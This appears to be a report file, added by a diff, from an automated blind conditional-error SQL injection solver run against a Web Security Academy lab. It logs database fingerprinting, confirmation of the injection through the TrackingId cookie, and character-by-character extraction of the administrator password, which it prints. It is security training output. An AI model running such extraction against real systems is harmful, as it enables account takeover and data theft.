@@ -1,0 +1,71 @@
+======================================================================
+  BLIND CONDITIONAL ERROR SQLi — REPORT
+======================================================================
+
+  URL           : https://0a6200a8046ff2d48c0177ce00ff002a.web-security-academy.net/
+  Cookie Param  : TrackingId
+  DBMS          : Oracle
+  Table         : users
+  Target User   : administrator
+  Password Len  : 20
+  Password      : 5edr5ho8gwrw6kpaxrhl
+  Timestamp     : 2026-05-12 18:57:07
+
+----------------------------------------------------------------------
+  SQLMAP COMMAND
+----------------------------------------------------------------------
+
+  
+
+----------------------------------------------------------------------
+  LOG
+----------------------------------------------------------------------
+
+[INFO] Starting blind conditional-error SQL injection solver
+[INFO] Target : https://0a6200a8046ff2d48c0177ce00ff002a.web-security-academy.net/
+[INFO] Cookie : TrackingId
+[INFO] Table  : users | User: administrator
+[INFO] Started: 2026-05-12 18:56:20
+[INFO] 
+[INFO] STEP 1: Fingerprinting Database Type...
+[SUCCESS] Oracle: valid→200 + invalid→500  →  CONFIRMED!
+[SUCCESS] Detected DBMS: Oracle
+[INFO] 
+[INFO] STEP 2: Verifying Conditional Error Injection...
+[SUCCESS] Conditional errors CONFIRMED: TRUE→500, FALSE→200
+[INFO] Checking user 'administrator' in 'users'...
+[SUCCESS] User 'administrator' EXISTS in 'users'!
+[INFO] 
+[INFO] STEP 3: Extracting Password...
+[INFO] [*] Finding password length (binary search)...
+[SUCCESS] Password length: 20 characters
+[INFO] [*] Extracting 20 chars (ASCII binary search, 10 threads)...
+[INFO] [+] Pos 09: 'g'  →  ????????g???????????
+[INFO] [+] Pos 01: '5'  →  5???????g???????????
+[INFO] [+] Pos 05: '5'  →  5???5???g???????????
+[INFO] [+] Pos 06: 'h'  →  5???5h??g???????????
+[INFO] [+] Pos 10: 'w'  →  5???5h??gw??????????
+[INFO] [+] Pos 07: 'o'  →  5???5ho?gw??????????
+[INFO] [+] Pos 04: 'r'  →  5??r5ho?gw??????????
+[INFO] [+] Pos 03: 'd'  →  5?dr5ho?gw??????????
+[INFO] [+] Pos 08: '8'  →  5?dr5ho8gw??????????
+[INFO] [+] Pos 02: 'e'  →  5edr5ho8gw??????????
+[INFO] [+] Pos 13: '6'  →  5edr5ho8gw??6???????
+[INFO] [+] Pos 11: 'r'  →  5edr5ho8gwr?6???????
+[INFO] [+] Pos 12: 'w'  →  5edr5ho8gwrw6???????
+[INFO] [+] Pos 17: 'x'  →  5edr5ho8gwrw6???x???
+[INFO] [+] Pos 16: 'a'  →  5edr5ho8gwrw6??ax???
+[INFO] [+] Pos 14: 'k'  →  5edr5ho8gwrw6k?ax???
+[INFO] [+] Pos 19: 'h'  →  5edr5ho8gwrw6k?ax?h?
+[INFO] [+] Pos 15: 'p'  →  5edr5ho8gwrw6kpax?h?
+[INFO] [+] Pos 18: 'r'  →  5edr5ho8gwrw6kpaxrh?
+[INFO] [+] Pos 20: 'l'  →  5edr5ho8gwrw6kpaxrhl
+[INFO] 
+[INFO] [✓] PASSWORD: 5edr5ho8gwrw6kpaxrhl
+[INFO] 
+[INFO] [*] STEP 4: SQLMap Command...
+[INFO] [+] Command:
+[INFO]     
+[INFO] 
+
+======================================================================
